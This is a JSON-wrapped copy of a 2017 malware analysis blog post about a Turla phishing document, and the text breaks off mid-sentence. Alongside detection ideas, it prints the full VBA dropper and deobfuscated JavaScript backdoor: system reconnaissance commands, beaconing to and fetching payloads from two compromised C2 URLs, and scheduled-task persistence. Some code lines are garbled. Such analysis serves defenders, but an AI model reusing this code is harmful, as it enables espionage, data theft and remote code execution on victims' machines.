{
    "id": "b8f33206-23b5-413d-8f0a-4670cb6d2f1d",
    "created_at": "2023-02-02T02:07:24.468147Z",
    "updated_at": "2025-03-27T02:16:20.929221Z",
    "deleted_at": null,
    "sha1_hash": "287efc1026a2c7c86d4a84a2cd38966e1c56967d",
    "title": "2017-10-05 - Analysis of a malicious DOC used by Turla APT group; hunting persistence via PowerShell",
    "authors": "",
    "file_creation_date": "2023-02-01T07:55:12Z",
    "file_modification_date": "2023-02-01T07:55:12Z",
    "file_size": 1872200,
    "plain_text": "# Analysis of a malicious DOC used by Turla APT group; hunting persistence via PowerShell\n\n**[blog.angelalonso.es/2017/10/analysis-of-malicious-doc-used-by-turla.html](https://blog.angelalonso.es/2017/10/analysis-of-malicious-doc-used-by-turla.html)**\n\n## Yesterday, John Lambert (@JohnLaTwC), from Microsoft Threat Intelligence Center twitted about some malicious document used by Turla ATP group. The malicious document was in VT since a few hours before his tweet\n\n In a daily basis I have to deal with malicious documents delivered by phishing emails so I was interested in understand how this malicious document works, if a new exploit was used, or any new technique. This analysis allows me to create detection use cases.\n The doc file mimics the agenda for an event sent from an embassy\n\n Once the macro has been executed, I can see that the process WINWORD.EXE spawns a WScript.exe command.\n\n\n-----\n\n## A use case which monitor any WScript.exe process which has been spawned by Office would detect this behaviour. Same would apply for PowerShell or cmd.exe This generic Use Case would detect lot of common malware which uses Office documents as infection vector.\n\n After some minutes, the script executes several other commands, like for example 'net use', 'net share', 'task list', 'ipconfig'', 'netstat', etc, to map the system and the network. This is also a valid use case to implement. Obviously, this will need some fine tuning depending on the environment, but as an start point can permit the detection of suspicious behaviour.\n\n\n-----\n\n## At a later stage the same script performs some internet connections. Here again, monitoring any script like wscript.exe, cmd.exe or powershell.exe making connections to Internet can provide a lot of meaningful information. (This is already discussed here http://blog.angelalonso.es/2017/08/malspam-campaign-exploiting-cve-2017.html)\n\n So this malicious file would be detected with a generic use cases which monitor properly some processes and connections.\n Now, let's take a look to the code to see if I find something interesting. The VBA macro is ofuscated\n\n\n-----\n\n-----\n\n```\nPublic OBKHLrC3vEDjVL As String\n\nPublic B8qen2T433Ds1bW As String\n\nFunction Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As\nLong) As Boolean\n\nDim THQNfU76nlSbtJ5nX8LY6 As Byte\n\nTHQNfU76nlSbtJ5nX8LY6 = 45\n\nFor i = 0 To M5wI32R3VF2g5B21EK4d - 1\n\nEjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6\n\nTHQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))\n\nNext i\n\nQ7JOhn5pIl648L6V43V = True\n\nEnd Function\n\nSub AutoClose()\n\nOn Error Resume Next\n\nKill OBKHLrC3vEDjVL\n\nOn Error Resume Next\n\nSet R7Ks7ug4hRR2weOy7 = CreateObject(\"Scripting.FileSystemObject\")\n\nR7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & \"\\*.*\", True\n\nSet R7Ks7ug4hRR2weOy7 = Nothing\n\nEnd Sub\n\nSub AutoOpen()\n\nOn Error GoTo MnOWqnnpKXfRO\n\nDim NEnrKxf8l511\n\nDim N18Eoi6OG6T2rNoVl41W As Long\n\nDim M5wI32R3VF2g5B21EK4d As Long\n\nN18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)\nNEnrKxf8l511 = FreeFile\n\nOpen (ActiveDocument.FullName) For Binary As #NEnrKxf8l511\nDim E2kvpmR17SI() As Byte\n\nReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)\n\nGet #NEnrKxf8l511, 1, E2kvpmR17SI\n\nDim KqG31PcgwTc2oL47hjd7Oi As String\n\nKqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)\n\nDim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD\n\nDim VUy5oj112fLw51h6S\n\nSet VUy5oj112fLw51h6S = CreateObject(\"vbscript.regexp\")\n\nVUy5oj112fLw51h6S.Pattern =\n\"MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh\"\n\nSet I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)\n\nDim Y5t4Ul7o385qK4YDhr\n\nIf I4j833DS5SFd34L3gwYQD.Count = 0 Then\n\nGoTo MnOWqnnpKXfRO\n\nEnd If\n\nFor Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD\n\nY5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex\n\nExit For\n\nNext\n\nDim Wk4o3X7x1134j() As Byte\n\nDim KDXl18qY4rcT As Long\n\nKDXl18qY4rcT = 16827\n\nReDim Wk4o3X7x1134j(KDXl18qY4rcT)\n\nGet #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j\n\n```\n\n-----\n\n```\nIf Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then\n\nGoTo MnOWqnnpKXfRO\n\nEnd If\n\nB8qen2T433Ds1bW = Environ(\"appdata\") & \"\\Microsoft\\Windows\"\n\nSet R7Ks7ug4hRR2weOy7 = CreateObject(\"Scripting.FileSystemObject\")\n\nIf Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then\n\nB8qen2T433Ds1bW = Environ(\"appdata\")\n\nEnd If\n\nSet R7Ks7ug4hRR2weOy7 = Nothing\n\nDim K764B5Ph46Vh\n\nK764B5Ph46Vh = FreeFile\n\nOBKHLrC3vEDjVL = B8qen2T433Ds1bW & \"\\\" & \"maintools.js\"\n\nOpen (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh\n\nPut #K764B5Ph46Vh, 1, Wk4o3X7x1134j\n\nClose #K764B5Ph46Vh\n\nErase Wk4o3X7x1134j\n\nSet R66BpJMgxXBo2h = CreateObject(\"WScript.Shell\")\n\nR66BpJMgxXBo2h.Run \"\"\"\" + OBKHLrC3vEDjVL + \"\"\"\" + \" EzZETcSXyKAdF_e5I2i1\"\n\nActiveDocument.Save\n\nExit Sub\n\nMnOWqnnpKXfRO:\n\nClose #K764B5Ph46Vh\n\nActiveDocument.Save\n\nEnd Sub\n\n## This code, basically creates a JS file C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Windows\\maintools.js and then executes it. However, for the execution to be success it is necessary to use the string \" EzZETcSXyKAdF_e5I2i1\"  as parameter.\n\n Moving forward and looking at the JS file C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Windows\\maintools.js I see it is obfuscated\n\n```\n\n-----\n\n```\ntry{var wvy1 = WScript.Arguments;var ssWZ = wvy1(0);var ES3c = y3zb();ES3c =\nLXv5(ES3c);ES3c = CpPT(ssWZ,ES3c);\n\neval(ES3c); \n\n```\n\n-----\n\n```\n}catch (e)\n\n{WScript.Quit();}function MTvK(CgqD){var XwH7 = CgqD.charCodeAt(0);if (XwH7 === 0x2B\n|| XwH7 === 0x2D) return 62\n\nif (XwH7 === 0x2F || XwH7 === 0x5F) return 63\n\nif (XwH7 < 0x30) return -1\n\nif (XwH7 < 0x30 + 10) return XwH7 - 0x30 + 26 + 26\n\nif (XwH7 < 0x41 + 26) return XwH7 - 0x41\n\nif (XwH7 < 0x61 + 26) return XwH7 - 0x61 + 26\n\n}function LXv5(d27x){var LUK7 =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";var i;var j;var\nn6T8;if (d27x.length % 4 > 0)\n\nreturn;var CHlB = d27x.length;var V8eR = d27x.charAt(CHlB - 2) === '=' ? 2 :\nd27x.charAt(CHlB - 1) === '=' ? 1 : 0\n\nvar mjqo = new Array(d27x.length * 3 / 4 - V8eR);var z8Ht = V8eR > 0 ? d27x.length 4 : d27x.length;var t2JG = 0;function XGH6 (b0tQ){mjqo[t2JG++] = b0tQ;}for (i = 0,j =\n0; i < z8Ht; i += 4,j += 3){n6T8 = (MTvK(d27x.charAt(i)) << 18) | (MTvK(d27x.charAt(i\n+ 1)) << 12) | (MTvK(d27x.charAt(i + 2)) << 6) | MTvK(d27x.charAt(i + 3));XGH6((n6T8\n& 0xFF0000) >> 16)\n\nXGH6((n6T8 & 0xFF00) >> 8)\n\nXGH6(n6T8 & 0xFF)\n\n}if (V8eR === 2){n6T8 = (MTvK(d27x.charAt(i)) << 2) | (MTvK(d27x.charAt(i + 1)) >> 4)\n\nXGH6(n6T8 & 0xFF)\n\n}else if (V8eR === 1){n6T8 = (MTvK(d27x.charAt(i)) << 10) | (MTvK(d27x.charAt(i + 1))\n<< 4) | (MTvK(d27x.charAt(i + 2)) >> 2)\n\nXGH6((n6T8 >> 8) & 0xFF)\n\nXGH6(n6T8 & 0xFF)\n\n}return mjqo\n\n}function CpPT(bOe3,F5vZ)\n\n{var AWy7 = [];var V2Vl = 0;var qyCq;var mjqo = '';for (var i = 0; i < 256; i++)\n\n{AWy7[i] = i;}for (var i = 0; i < 256; i++)\n\n{V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;qyCq =\nAWy7[i];AWy7[i] = AWy7[V2Vl];AWy7[V2Vl] = qyCq;}var i = 0;var V2Vl = 0;for (var y =\n0; y < F5vZ.length; y++)\n\n{i = (i + 1) % 256;V2Vl = (V2Vl + AWy7[i]) % 256;qyCq = AWy7[i];AWy7[i] =\nAWy7[V2Vl];AWy7[V2Vl] = qyCq;mjqo += String.fromCharCode(F5vZ[y] ^ AWy7[(AWy7[i] +\nAWy7[V2Vl]) % 256]);}return mjqo;}function y3zb()\n\n{var qGxZ =\n\"zAubgpaJRj0tIneNNZL0wjPqnSRiIygEC/sEWEDJU8LoihPXjdbeiMqcs6AavcLCPXuFM9LJ7svWGgIJKnOOK\n qGxZ;}\n\n## An easy way to view the code a bit cleaner, is to print the code before the eval(ES3c);   with a WScript.Echo(ES3c)\n\n```\n\n-----\n\n## Once done, I run the command with the proper string as I got the code:\n\n\n-----\n\n```\nfunction UspD(zDmy)\n\n{var m3mH = WScript.CreateObject(\"ADODB.Stream\")\n\nm3mH.Type = 2;\n\nm3mH.CharSet = '437';\n\nm3mH.Open();\n\nm3mH.LoadFromFile(zDmy);\n\nvar c0xi = m3mH.ReadText;\n\nm3mH.Close();\n\nreturn cz_b(c0xi);\n\n}\n\nvar CKpR = new Array (\"http://www.saipadiesel124.com/wpcontent/plugins/imsanity/tmp.php\",\"http://www.folk-cantabria.com/wpcontent/plugins/wp-statistics/includes/classes/gallery_create_page_field.php\");\n\nvar tpO8 = \"w3LxnRSbJcqf8HrU\";\n\nvar auME = new Array(\"systeminfo > \",\"net view >> \",\"net view /domain >> \",\"tasklist\n/v >> \",\"gpresult /z >> \",\"netstat -nao >> \",\"ipconfig /all >> \",\"arp -a >> \",\"net\nshare >> \",\"net use >> \",\"net user >> \",\"net user administrator >> \",\"net user\n/domain >> \",\"net user administrator /domain >> \",\"set >> \",\"dir\n%systemdrive%\\x5cUsers\\x5c*.* >> \",\"dir\n%userprofile%\\x5cAppData\\x5cRoaming\\x5cMicrosoft\\x5cWindows\\x5cRecent\\x5c*.* >>\n\",\"dir %userprofile%\\x5cDesktop\\x5c*.* >> \",\"tasklist /fi \\x22modules eq\nwow64.dll\\x22 >> \",\"tasklist /fi \\x22modules ne wow64.dll\\x22 >> \",\"dir\n\\x22%programfiles(x86)%\\x22 >> \",\"dir \\x22%programfiles%\\x22 >> \",\"dir %appdata%\n>>\");\n\nvar QUjy = new ActiveXObject(\"Scripting.FileSystemObject\");\n\nvar LIxF = WScript.ScriptName;\nvar w5mY = \"\";\n\nvar ruGx = TfOh();\n\n\nfunction hLit(XngP,y1qa)\n\n{char_set = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\nvar Rj3c = \"\";\n\nvar OKpB = \"\";\n\nfor (var i = 0;\n\n i < XngP.length;\n\n ++i)\n\n{var B8wU = XngP.charCodeAt(i);\n\nvar LUxg = B8wU.toString(2);\n\nwhile (LUxg.length < (y1qa ? 8 : 16))\n\nLUxg = \"0\" + LUxg;\n\nOKpB += LUxg;\n\nwhile (OKpB.length >= 6)\n\n{var vjUu = OKpB.slice(0,6);\n\nOKpB = OKpB.slice(6);\n\nRj3c += this.char_set.charAt(parseInt(vjUu,2));\n\n}}if (OKpB)\n\n{while (OKpB.length < 6) OKpB += \"0\";\n\nRj3c += this.char_set.charAt(parseInt(OKpB,2));\n\n}while (Rj3c.length % (y1qa ? 4 : 8) != 0)\n\nRj3c += \"=\";\n\n```\n\n-----\n\n```\nreturn Rj3c;\n\n}\n\nvar b92A = [];\n\nb92A['C7']  = '80';\n\nb92A['FC']  = '81';\n\nb92A['E9']  = '82';\n\nb92A['E2']  = '83';\n\nb92A['E4']  = '84';\n\nb92A['E0']  = '85';\n\nb92A['E5']  = '86';\n\nb92A['E7']  = '87';\n\nb92A['EA']  = '88';\n\nb92A['EB']  = '89';\n\nb92A['E8']  = '8A';\n\nb92A['EF']  = '8B';\n\nb92A['EE']  = '8C';\n\nb92A['EC']  = '8D';\n\nb92A['C4']  = '8E';\n\nb92A['C5']  = '8F';\n\nb92A['C9']  = '90';\n\nb92A['E6']  = '91';\n\nb92A['C6']  = '92';\n\nb92A['F4']  = '93';\n\nb92A['F6']  = '94';\n\nb92A['F2']  = '95';\n\nb92A['FB']  = '96';\n\nb92A['F9']  = '97';\n\nb92A['FF']  = '98';\n\nb92A['D6']  = '99';\n\nb92A['DC']  = '9A';\n\nb92A['A2']  = '9B';\n\nb92A['A3']  = '9C';\n\nb92A['A5']  = '9D';\n\nb92A['20A7'] = '9E';\n\nb92A['192'] = '9F';\n\nb92A['E1']  = 'A0';\n\nb92A['ED']  = 'A1';\n\nb92A['F3']  = 'A2';\n\nb92A['FA']  = 'A3';\n\nb92A['F1']  = 'A4';\n\nb92A['D1']  = 'A5';\n\nb92A['AA']  = 'A6';\n\nb92A['BA']  = 'A7';\n\nb92A['BF']  = 'A8';\n\nb92A['2310'] = 'A9';\n\nb92A['AC']  = 'AA';\n\nb92A['BD']  = 'AB';\n\nb92A['BC']  = 'AC';\n\nb92A['A1']  = ;\n\nb92A['AB']  = 'AE';\n\nb92A['BB']  = 'AF';\n\n```\n\n-----\n\n```\nb92A[ 2591 ] B0 ;\n\nb92A['2592'] = 'B1';\n\nb92A['2593'] = 'B2';\n\nb92A['2502'] = 'B3';\n\nb92A['2524'] = 'B4';\n\nb92A['2561'] = 'B5';\n\nb92A['2562'] = 'B6';\n\nb92A['2556'] = 'B7';\n\nb92A['2555'] = 'B8';\n\nb92A['2563'] = 'B9';\n\nb92A['2551'] = 'BA';\n\nb92A['2557'] = 'BB';\n\nb92A['255D'] = 'BC';\n\nb92A['255C'] = 'BD';\n\nb92A['255B'] = 'BE';\n\nb92A['2510'] = 'BF';\n\nb92A['2514'] = 'C0';\n\nb92A['2534'] = 'C1';\n\nb92A['252C'] = 'C2';\n\nb92A['251C'] = 'C3';\n\nb92A['2500'] = 'C4';\n\nb92A['253C'] = 'C5';\n\nb92A['255E'] = 'C6';\n\nb92A['255F'] = 'C7';\n\nb92A['255A'] = 'C8';\n\nb92A['2554'] = 'C9';\n\nb92A['2569'] = 'CA';\n\nb92A['2566'] = 'CB';\n\nb92A['2560'] = 'CC';\n\nb92A['2550'] = 'CD';\n\nb92A['256C'] = 'CE';\n\nb92A['2567'] = 'CF';\n\nb92A['2568'] = 'D0';\n\nb92A['2564'] = 'D1';\n\nb92A['2565'] = 'D2';\n\nb92A['2559'] = 'D3';\n\nb92A['2558'] = 'D4';\n\nb92A['2552'] = 'D5';\n\nb92A['2553'] = 'D6';\n\nb92A['256B'] = 'D7';\n\nb92A['256A'] = 'D8';\n\nb92A['2518'] = 'D9';\n\nb92A['250C'] = 'DA';\n\nb92A['2588'] = 'DB';\n\nb92A['2584'] = 'DC';\n\nb92A['258C'] = 'DD';\n\nb92A['2590'] = 'DE';\n\nb92A['2580'] = 'DF';\n\nb92A['3B1'] = 'E0';\n\nb92A['DF']  = 'E1';\n\nb92A['393'] = 'E2';\n\nb92A['3C0'] = 'E3';\n\n```\n\n-----\n\n```\nb92A[ 3A3 ]  E4 ;\n\nb92A['3C3'] = 'E5';\n\nb92A['B5']  = 'E6';\n\nb92A['3C4'] = 'E7';\n\nb92A['3A6'] = 'E8';\n\nb92A['398'] = 'E9';\n\nb92A['3A9'] = 'EA';\n\nb92A['3B4'] = 'EB';\n\nb92A['221E'] = 'EC';\n\nb92A['3C6'] = 'ED';\n\nb92A['3B5'] = 'EE';\n\nb92A['2229'] = 'EF';\n\nb92A['2261'] = 'F0';\n\nb92A['B1']  = 'F1';\n\nb92A['2265'] = 'F2';\n\nb92A['2264'] = 'F3';\n\nb92A['2320'] = 'F4';\n\nb92A['2321'] = 'F5';\n\nb92A['F7']  = 'F6';\n\nb92A['2248'] = 'F7';\n\nb92A['B0']  = 'F8';\n\nb92A['2219'] = 'F9';\n\nb92A['B7']  = 'FA';\n\nb92A['221A'] = 'FB';\n\nb92A['207F'] = 'FC';\n\nb92A['B2']  = 'FD';\n\nb92A['25A0'] = 'FE';\n\nb92A['A0']  = 'FF';\n\n\nfunction TfOh()\n\n{var ayuh = Math.ceil(Math.random()*10 + 25);\n\nvar name = String.fromCharCode(Math.ceil(Math.random()*24 + 65));\n\nvar dc9V = WScript.CreateObject(\"WScript.Network\");\n\nw5mY = dc9V.UserName;\n\nfor (var count = 0;\n\n count <ayuh ;\n\ncount++ )\n\n{switch (Math.ceil(Math.random()*3))\n {case 1:\n\nname = name + Math.ceil(Math.random()*8);\n\n   break;\n\n  case 2:\n\n    name = name + String.fromCharCode(Math.ceil(Math.random()*24 + 97));\n\n   break;\n\n  default:\n\n    name = name + String.fromCharCode(Math.ceil(Math.random()*24 + 65));\n\n   break;\n\n }}return name;\n\n}\n\nvar wyKN = Blgx(bIdG());\n\n```\n\n-----\n\n```\ntry\n\n{var WE86 = bIdG();\n\nrGcR();\n\njSm8();\n\n}catch(e)\n\n{WScript.Quit();\n\n}\n\n\n\nfunction jSm8()\n\n{var c9lr = Fv6b();\n\nwhile(true)\n\n{for (var i = 0;\n\n i < CKpR.length;\n\n i++)\n\n{var Ysyo = CKpR[i];\n\nvar f3cb = XEWG(Ysyo,c9lr);\n\nswitch (f3cb)\n\n{case \"good\":  \n\n  break;\n\n case \"exit\": WScript.Quit();\n\n  break;\n\n case \"work\": XBL3(Ysyo);\n\n  break;\n\n case \"fail\": tbMu();\n\n  break;\n\n default:\n\n  break;\n\n}TfOh();\n\n}WScript.Sleep((Math.random()*300 + 3600) * 1000);\n\n}}function bIdG()\n\n{var spq3= this['\\u0041\\u0063\\u0074i\\u0076eX\\u004F\\u0062j\\u0065c\\u0074'];\n\nvar zBVv = new spq3('\\u0057\\u0053cr\\u0069\\u0070\\u0074\\u002E\\u0053he\\u006C\\u006C');\n\nreturn zBVv;\n\n}function XBL3(B_TG)\n\n{var YIme = wyKN + LIxF.substring(0,LIxF.length - 2) + \"pif\";\n\nvar Kpxo = new ActiveXObject(\"MSXML2.XMLHTTP\");\n\nKpxo.OPEN(\"post\",B_TG,false);\n\nKpxo.SETREQUESTHEADER(\"user-agent:\",\"Mozilla/5.0 (Windows NT 6.1;\n\n Win64;\n\n x64);\n\n \" + Sz8k());\n\nKpxo.SETREQUESTHEADER(\"content-type:\",\"application/octet-stream\");\n\nKpxo.SETREQUESTHEADER(\"content-length:\",\"4\");\n\nKpxo.SEND(\"work\");\n\nif (QUjy.FILEEXISTS(YIme))\n\n{QUjy.DELETEFILE(YIme);\n\n}if (Kpxo.STATUS == 200)\n\n```\n\n-----\n\n```\n{var m3mH new ActiveXObject( ADODB.STREAM );\n\nm3mH.TYPE = 1;\n\nm3mH.OPEN();\n\nm3mH.WRITE(Kpxo.responseBody);\n\nm3mH.Position = 0;\n\nm3mH.Type = 2;\n\nm3mH.CharSet = \"437\";\n\nvar c0xi = m3mH.ReadText(m3mH.Size);\n\nvar ptF0 = FXx9(\"2f532d6baec3d0ec7b1f98aed4774843\",cz_b(c0xi));\n\nNoRS(ptF0,YIme);\n\n     m3mH.Close();\n\n}var ruGx = TfOh();\n\nc5ae(YIme,B_TG);\n\nWScript.Sleep(30000);\n\nQUjy.DELETEFILE(YIme);\n\n}function tbMu()\n\n{QUjy.DELETEFILE(WScript.SCRIPTFULLNAME);\n\neV_C(\"TaskManager\",\"Windows Task\nManager\",w5mY,v_FileName,\"EzZETcSXyKAdF_e5I2i1\",wyKN,false);\n\nKhDn(\"TaskManager\");\n\nWScript.Quit();\n\n}function XEWG(uXHK,hm2j)\n\n{try\n\n{var Kpxo = new ActiveXObject(\"MSXML2.XMLHTTP\");\n\nKpxo.OPEN(\"post\",uXHK,false);\n\nKpxo.SETREQUESTHEADER(\"user-agent:\",\"Mozilla/5.0 (Windows NT 6.1;\n\n Win64;\n\n x64);\n\n \" + Sz8k());\n\nKpxo.SETREQUESTHEADER(\"content-type:\",\"application/octet-stream\");\n\nvar rRi3 = hLit(hm2j,true);\n\nKpxo.SETREQUESTHEADER(\"content-length:\",rRi3.length);\n\nKpxo.SEND(rRi3);\n\nreturn Kpxo.responseText;\n\n}catch(e)\n\n{return \"\";\n\n}}function Sz8k()\n\n{var n9mV =\"\";\n\nvar dc9V = WScript.CreateObject(\"WScript.Network\");\n\nvar rRi3 = tpO8 + dc9V.ComputerName + w5mY;\n\nfor (var i = 0;\n\n i < 16;\n\n i++)\n\n{var YsXA = 0\n\nfor (var j = i;\n\n j < rRi3.length - 1;\n\n j++)\n\n{YsXA = YsXA ^ rRi3.charCodeAt(j);\n\n}YsXA =(YsXA % 10);\n\nn9mV = n9mV + YsXA.toString(10);\n\n}n9mV = n9mV + tpO8;\n\nreturn n9mV;\n\n```\n\n-----\n\n```\n}function rGcR()\n\n{v_FileName = wyKN + LIxF.substring(0,LIxF.length - 2) + \"js\";\n\nQUjy.COPYFILE(WScript.ScriptFullName,wyKN + LIxF);\n\nvar HFp7 = (Math.random()*150 + 350) * 1000;\n\nWScript.Sleep(HFp7);\n\neV_C(\"TaskManager\",\"Windows Task\nManager\",w5mY,v_FileName,\"EzZETcSXyKAdF_e5I2i1\",wyKN,true);\n\n}function Fv6b()\n\n{var m_Rr = wyKN + \"~dat.tmp\";\n\nfor (var i = 0;\n\n i < auME.length;\n\n i++)\n\n{WE86.Run(\"cmd.exe /c \" + auME[i] + \"\\x22\" + m_Rr + \"\\x22\",0,true);\n}var nRVN = UspD(m_Rr);\n\nWScript.Sleep(1000);\n\nQUjy.DELETEFILE(m_Rr);\n\nreturn FXx9(\"2f532d6baec3d0ec7b1f98aed4774843\",nRVN);\n\n}function c5ae(YIme,B_TG)\n\n{try\n\n{if (QUjy.FILEEXISTS(YIme))\n\n{WE86.Run(\"\\x22\" + YIme + \"\\x22\" );\n\n}}catch(e)\n\n{var Kpxo = new ActiveXObject(\"MSXML2.XMLHTTP\");\n\nKpxo.OPEN(\"post\",B_TG,false);\n\nvar ePMy = \"error\";\n\nKpxo.SETREQUESTHEADER(\"user-agent:\",\"Mozilla/5.0 (Windows NT 6.1;\n\n Win64;\n\n x64);\n\n \" + Sz8k());\n\nKpxo.SETREQUESTHEADER(\"content-type:\",\"application/octet-stream\");\n\nKpxo.SETREQUESTHEADER(\"content-length:\",ePMy.length);\n\nKpxo.SEND(ePMy);\n\nreturn \"\";\n\n}}function RPbY(r_X5)\n\n{var w8rG=\"0123456789ABCDEF\";\n\nvar yjrw = w8rG.substr(r_X5 & 15,1);\n\nwhile(r_X5>15)\n\n{r_X5 >>>= 4;\n\nyjrw = w8rG.substr(r_X5 & 15,1) + yjrw;\n\n}return yjrw;\n\n}function NptO(jlEi)\n\n{return parseInt(jlEi,16);\n\n}function eV_C(Bjmr,RT6x,O7Ec,YBwP,T9Px,egNr,rmGH)\n\n{try\n\n{var BGfI = WScript.CreateObject(\"Schedule.Service\");\n\nBGfI.Connect();\n\nvar w2cQ = BGfI.GetFolder(\"WPD\");\n\nvar xSm3 = BGfI.NewTask(0);\n\nxSm3.Principal.UserId = O7Ec;\n\nxSm3.Principal.LogonType = 6;\n\n```\n\n-----\n\n```\nvar wK2F xSm3.RegistrationInfo;\n\nwK2F.Description = RT6x;\n\nwK2F.Author = O7Ec;\n\nvar aYbx = xSm3.Settings;\n\naYbx.Enabled = true;\n\naYbx.StartWhenAvailable = true;\n\naYbx.Hidden = rmGH;\n\nvar oSP7 = \"2015-07-12T11:47:24\";\n\nvar svaG = \"2020-03-21T08:00:00\";\n\nvar LDoN = xSm3.Triggers;\n\nvar r9EC = LDoN.Create(9);\n\nr9EC.StartBoundary = oSP7;\n\nr9EC.EndBoundary = svaG;\n\nr9EC.Id = \"LogonTriggerId\";\n\nr9EC.UserId = O7Ec;\n\nr9EC.Enabled = true;\n\nvar gQu9 = xSm3.Actions.Create(0);\n\ngQu9.Path = YBwP;\n\ngQu9.Arguments = T9Px;\n\ngQu9.WorkingDirectory = egNr;\n\nw2cQ.RegisterTaskDefinition(Bjmr,xSm3,6,\"\",\"\",3);\n\nreturn true;\n\n}catch(Err)\n\n{return false;\n\n}}function KhDn(Bjmr)\n\n{try\n\n{var UGgw = false;\n\nvar BGfI = WScript.CreateObject(\"Schedule.Service\");\n\nBGfI.Connect()\n\n\nvar w2cQ = BGfI.GetFolder(\"WPD\");\n\nvar FLs6 = w2cQ.GetTasks(0);\n\nif (FLs6.count >= 0)\n\n{var gk1H = new Enumerator(FLs6);\n\nfor (;\n\n !gk1H.atEnd();\n\n gk1H.moveNext())\n\n{if (gk1H.item().name == Bjmr)\n\n{w2cQ.DeleteTask(Bjmr,0);\n\nUGgw = true;\n\n}}}}catch(Err)\n\n{return false;\n\n}}function cz_b(S3Ws)\n\n{var n9mV = [];\n\nvar mvAu = S3Ws.length;\n\nfor (var i = 0;\n\n i < mvAu;\n\n i++)\n\n{var wtVX = S3Ws.charCodeAt(i);\n\nif(wtVX >= 128)\n\n{var h = b92A['' + RPbY(wtVX)];\n\n```\n\n-----\n\n```\nwtVX NptO(h);\n\n}n9mV.push(wtVX);\n\n}return n9mV;\n\n}function NoRS(ExY2,igeK)\n\n{var m3mH = WScript.CreateObject(\"ADODB.Stream\");\n\nm3mH.type = 2;\n\nm3mH.Charset = \"iso-8859-1\";\n\nm3mH.Open();\n\nm3mH.WriteText(ExY2);\n\nm3mH.Flush();\n\nm3mH.Position = 0;\n\nm3mH.SaveToFile(igeK,2);\n\nm3mH.close();\n\n}function Blgx(gaWo)\n\n{wyKN = \"c:\\x5cUsers\\x5c\" + w5mY +\n\"\\x5cAppData\\x5cLocal\\x5cMicrosoft\\x5cWindows\\x5c\";\n\nif (! QUjy.FOLDEREXISTS(wyKN))\n\nwyKN = \"c:\\x5cUsers\\x5c\" + w5mY + \"\\x5cAppData\\x5cLocal\\x5cTemp\\x5c\";\n\nif (! QUjy.FOLDEREXISTS(wyKN))\n\nwyKN = \"c:\\x5cDocuments and Settings\\x5c\" + w5mY + \"\\x5cApplication\nData\\x5cMicrosoft\\x5cWindows\\x5c\";\n\nreturn wyKN\n\n}function FXx9(Z_3F,VMd7)\n\n{var NNSX = [];\n\nvar JDro = 0;\n\nvar KagY;\n\nvar n9mV = '';\n\nfor (var i = 0;\n\n i < 256;\n\n i++)\n\n{NNSX[i] = i;\n\n}for (var i = 0;\n\n i < 256;\n\n i++)\n\n{JDro = (JDro + NNSX[i] + Z_3F.charCodeAt(i % Z_3F.length)) % 256;\n\nKagY = NNSX[i];\n\nNNSX[i] = NNSX[JDro];\n\nNNSX[JDro] = KagY;\n\n}var i = 0;\n\nvar JDro = 0;\n\nfor (var y = 0;\n\n y < VMd7.length;\n\n y++)\n\n{i = (i + 1) % 256;\n\nJDro = (JDro + NNSX[i]) % 256;\n\nKagY = NNSX[i];\n\nNNSX[i] = NNSX[JDro];\n\nNNSX[JDro] = KagY;\n\nn9mV += String.fromCharCode(VMd7[y] ^ NNSX[(NNSX[i] + NNSX[JDro]) % 256]);\n\n}return n9mV;\n\n}\n\n```\n\n-----\n\n## In the 'clean' code it is possible to see the URL for the second stage payload, which at the time of this analysis did not work anymore\n\n \"http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php\",\n \"http://www.folk-cantabria.com/wp-content/plugins/wp- statistics/includes/classes/gallery_create_page_field.php\n\n Additionally, the list of commands to map the system are in the code:\n\n systeminfo > \",\"net view >> \",\"net view /domain >> \",\"tasklist /v >> \",\"gpresult /z >> \",\"netstat -nao >> \",\"ipconfig /all >> \",\"arp -a >> \",\"net share >> \",\"net use >> \",\"net user >> \",\"net user administrator >> \",\"net user /domain >> \",\"net user administrator /domain >> \",\"set >> \",\"dir %systemdrive%\\x5cUsers\\x5c*.* >> \",\"dir %userprofile%\\x5cAppData\\x5cRoaming\\x5cMicrosoft\\x5cWindows\\x5cRecent\\x5c*.* >> \",\"dir %userprofile%\\x5cDesktop\\x5c*.* >> \",\"tasklist /fi \\x22modules eq wow64.dll\\x22 >> \",\"tasklist /fi \\x22modules ne wow64.dll\\x22 >> \",\"dir \\x22%programfiles(x86)%\\x22 >> \",\"dir \\x22%programfiles%\\x22 >> \",\"dir %appdata% >>\");\n\n But the most interesting part is how the persistence is done, via a schedule Service (schedule task).\n\n\n-----\n\n## A schedule task with name \"TaskManager\" under a folder WPD is created. This task executes when the user logs in and calls the JS code 